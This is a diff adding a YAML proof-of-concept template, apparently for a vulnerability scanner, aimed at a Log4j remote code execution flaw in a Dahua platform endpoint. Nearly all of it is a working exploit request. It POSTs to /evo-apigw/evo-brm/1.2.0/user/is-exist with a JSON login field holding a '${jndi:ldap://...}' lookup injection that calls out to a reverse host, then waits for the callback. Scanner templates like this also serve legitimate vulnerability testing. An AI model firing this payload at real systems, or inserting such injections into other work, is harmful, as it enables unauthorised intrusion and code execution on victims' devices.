@@ -1,0 +1,27 @@
+name: poc-yaml-dahua-random-log4j-rce
+transport: http
+
+set:
+  reverse: newReverse()
+  reverseDomain: reverse.domain
+
+  
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /evo-apigw/evo-brm/1.2.0/user/is-exist
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: application/json;charset=utf-8
+
+
+      body: '{"loginName":"${jndi:ldap://{{reverseDomain}}}"}'
+    expression: reverse.wait(1)
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139307327
